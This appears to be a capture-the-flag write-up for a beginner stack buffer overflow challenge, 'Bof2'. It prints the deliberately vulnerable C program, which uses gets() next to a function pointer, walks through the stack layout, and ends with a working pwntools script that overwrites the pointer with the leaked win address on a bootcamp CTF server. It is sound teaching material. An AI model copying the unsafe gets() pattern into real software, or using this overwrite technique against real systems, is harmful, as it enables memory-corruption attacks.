# Bof2

Bof2 is the second buffer overflow challenge of the CTF. In this case, our buffer overflow is a stack-based buffer overflow which means we'll end up overwriting values on the stack to get the flag. The full program is posted below for convenience.

## Program Analysis

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void win(){
    system("cat ./flag.txt");
    exit(0);
}

void handler(int num){
    printf("Bye!\n");
    exit(-1);
}

int main(void){
    volatile void (*foo)(void) = NULL;
    char buffer[16];

    signal(SIGALRM, handler);
    alarm(5);

	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);

    printf("win: %p\n", win);

    gets(buffer);

    printf("foo: %p\n", foo);
    if (foo == (void *)win)
        foo();

    printf("Better luck next time.\n");
    exit(-1);

    return 0;
}
```

Taking a cursory look at the program we notice a few things:

1. The program will exit after 5 seconds of being alive:

```C
void handler(int num){
    printf("Bye!\n");
    exit(-1);
}
...
signal(SIGALRM, handler);
alarm(5);
```

2. There is a character array and an integer. The character array has enough space on the stack for 16 characters. One thing to note here is that they are contiguous (right next to eachother/touching) in memory.

```C
volatile void (*foo)(void) = NULL;
char buffer[16];
```

3. There is a `printf` call that prints the address of the `win` function.

```C
printf("win: %p\n", win);
```

4. There is a call to `gets`. The `gets` function is inherently dangerous. If you run the command `man gets` to see get's manpage, you will see the security notice at the bottom:

> SECURITY CONSIDERATIONS
>     **The gets() function cannot be used securely**.  Because of its lack of
>     bounds checking, and the inability for the calling program to reliably
>     determine the length of the next incoming line, **the use of this function
>     enables malicious users to arbitrarily change a running program's func-
>     tionality through a buffer overflow attack**.  It is strongly suggested
>     that the fgets() function be used in all cases.  (See the FSA.)

```C
gets(buffer);
```

This means that we can send an unlimited amount of data to the program which will be written into the buffer without regard for any safety considerations.

4. In order to win, the address of `foo` must equal the address of `win`.

```
if (foo == (void *)win)
    foo();
```

Let's talk about getting the address of `win`. Because the address returned is the same every time, you could simply do this entire exploit using the `echo` command, but if a program had ASLR enabled (the address is different every time), you'd want to be able to retrieve the address printed, parse it, and use it in your exploit.

```Python
>>> line = r.recvline()
'win: 0x80485ab\n'
>>> line = line.rstrip("\n")
'win: 0x80485ab'
>>> line = line.split(" ")
['win:', '0x80485ab']
>>> address = line[-1]
'0x80485ab'
```

Now that we have the address of the `win` function, we need to convert it to an integer and `pack` it into 32-bit little endian. What this means is that when we send the address, it will send the data not as characters in a string but as bytes. If that doesn't make sense, do some googling on little endian and byte packing.

```Python
>>> address = '0x80485ab'
>>> address = int(address, 16)
134514091
>>> hex(134514091)
'0x80485ab'
>>> p32(address)
'\xab\x85\x04\x08'
```

Onto the exploit!

## Exploit

Now that we have completely analyzed the program, we can plan our attack.

Our stack looks like this in memory:

```
+============================+
|           STACK            |
+======================+=====+
|         buffer       | foo |
+---+---+---+-----+----+-----+
| 0 | 1 | 2 | ... | 15 |  0  |
+===+===+===+=====+====+=====+
```

In this case, the numbers on the bottom represent the index for each element. From here on out, the numbers on the bottom will represent values in memory.

If we were to write "AB" to the buffer, it would look like this:

```
+============================+
|           STACK            |
+======================+=====+
|         buffer       | foo |
+---+---+---+-----+----+-----+
| A | B | 0 | ... |  0 |  0  |
+===+===+===+=====+====+=====+
```

What if we wrote 16 A's?

```
+============================+
|           STACK            |
+======================+=====+
|         buffer       | foo |
+---+---+---+-----+----+-----+
| A | A | A | ... |  A |  0  |
+===+===+===+=====+====+=====+
```

This isn’t devastating as we didn’t corrupt any memory, but the buffer no longer contains a valid C string. Recall that C strings must be null-terminated. If mod was not set to 0, a call to printf would have trouble knowing where to stop and it would continue printing until it hit a NULL character.

What would happen if we wrote 16 A's and the address of `win`?

```
+====================================+
|                 STACK              |
+======================+=============+
|         buffer       |     foo     |
+---+---+---+-----+----+-------------+
| A | A | A | ... |  A |  0x80485ab  |
+===+===+===+=====+====+=============+
```

Our function pointer, foo, has been modified to equal the value of `win`! We successfully exploited the buffer overflow and overwrote the function pointer with the `win` function address, causing it to execute and print the flag!

A simple example of this exploit in pwntools would look like:

```Python
#!/usr/bin/env python2

from pwn import *

context.update(arch='i386', os='linux')

r = remote('bootcamp.ctf.cuctf.io', 9100)
address = r.recvline().rstrip("\n").split(" ")[-1]
payload = "A" * 16
payload += p32(int(address, 0))
r.sendline(payload)
r.interactive()
```
